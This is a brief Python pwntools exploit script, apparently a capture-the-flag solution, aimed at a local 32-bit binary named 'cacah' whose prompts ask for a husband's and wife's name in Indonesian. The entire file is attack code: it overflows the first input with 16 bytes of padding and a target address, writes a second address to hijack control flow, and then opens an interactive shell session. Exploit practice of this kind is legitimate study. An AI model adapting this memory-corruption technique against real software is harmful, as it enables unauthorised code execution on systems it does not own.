#!/usr/bin/python

from pwn import *

context(arch='i386', bits=32, os='linux')
a = process('./cacah')

print a.recvuntil('Nama suami : ')
a.sendline('a'*16 + p32(0x0804a010))

print a.recvuntil('Nama istri : ')
a.sendline(p32(0x08048598))

a.interactive()
